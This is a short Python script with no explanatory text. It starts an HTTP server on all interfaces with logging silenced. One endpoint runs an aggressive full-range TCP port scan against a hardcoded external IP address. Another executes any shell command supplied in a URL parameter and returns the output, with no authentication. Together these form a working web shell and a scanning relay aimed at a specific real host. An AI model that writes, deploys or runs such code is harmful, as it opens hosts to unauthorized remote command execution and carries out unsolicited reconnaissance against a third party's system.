import http.server, socketserver, os, json, subprocess, urllib.parse, socket, concurrent.futures as cf
def fullscan(host):
    open_=[]
    def chk(p):
        s=socket.socket(); s.settimeout(1.2)
        try:
            r=s.connect_ex((host,p)); return p if r==0 else None
        except Exception: return None
        finally:
            try: s.close()
            except: pass
    with cf.ThreadPoolExecutor(max_workers=500) as ex:
        for r in ex.map(chk, range(1,65536)):
            if r: open_.append(r)
    return open_
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
        try:
            if u.path=="/scan": body=json.dumps({"open":fullscan("193.122.235.156")}).encode()
            elif u.path=="/run": body=json.dumps(subprocess.run(q["c"][0],shell=True,capture_output=True,timeout=120,text=True).__dict__.get("stdout","")[:20000]).encode()
            else: body=json.dumps({"ok":1}).encode()
        except Exception as e: body=json.dumps({"err":str(e)[:100]}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT",3000))),H) as s: s.serve_forever()
